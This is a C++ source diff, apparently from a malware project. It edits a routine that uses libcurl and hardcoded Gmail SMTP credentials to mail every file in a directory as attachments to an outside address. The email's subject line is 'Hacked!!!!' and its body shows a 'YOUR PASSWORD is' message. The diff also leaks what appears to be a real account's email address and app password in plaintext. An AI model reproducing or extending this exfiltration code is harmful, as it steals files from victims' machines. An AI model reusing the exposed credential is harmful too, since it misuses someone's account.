@@ -17,7 +17,6 @@ namespace fs = std::filesystem;
 
 static const std::string from_email = "itsrealsoul5@gmail.com";
 static const std::string to_email = "itsrealsoul5@gmail.com";
-static const std::string cc_email = "cc_email@example.com";
 static const std::string smtp_url = "smtps://smtp.gmail.com:465";
 static const std::string username = "itsrealsoul5@gmail.com";
 static const std::string password = "dibl reij iuzp kohh";
@@ -50,29 +49,30 @@ void send_email_with_attachments_from_directory(const std::string &directory_pat
         curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from_email.c_str());
 
         recipients = curl_slist_append(recipients, to_email.c_str());
-        recipients = curl_slist_append(recipients, cc_email.c_str());
         curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
 
         curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
         curl_easy_setopt(curl, CURLOPT_READDATA, &email_body);
         curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
         curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
+        //curl_easy_setopt(curl, CURLOPT_SUBJECT, "Your Email Subject Here");
+
+        struct curl_slist *headers = NULL;
+        headers = curl_slist_append(headers, "Subject: Hacked!!!!");
 
         // Create MIME for attachments
         curl_mime *mime;
         curl_mimepart *part;
         mime = curl_mime_init(curl);
-
-        // 기존 텍스트 본문을 위한 MIME 파트 생성
-        curl_mimepart *text_part = curl_mime_addpart(mime);
-        curl_mime_data(text_part, email_body_text.c_str(), CURL_ZERO_TERMINATED);
-        curl_mime_type(text_part, "text/plain");
+        part = curl_mime_addpart(mime);
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
         // HTML 본문을 위한 MIME 파트 생성
-        std::string html_body = "<html><body><h1>YOUR PASSWORD is</h1><p>" + email_body_text + "</p></body></html>";
+        std::string html_body = "<html><body><h2>YOUR PASSWORD is</h2><h1 style='color: red;'>" + email_body_text + "</h1></body></html>";
         curl_mimepart *html_part = curl_mime_addpart(mime);
         curl_mime_data(html_part, html_body.c_str(), CURL_ZERO_TERMINATED);
         curl_mime_type(html_part, "text/html");
+        
 
         // Add all files in the directory as attachments
         for (const auto &entry : fs::directory_iterator(directory_path))
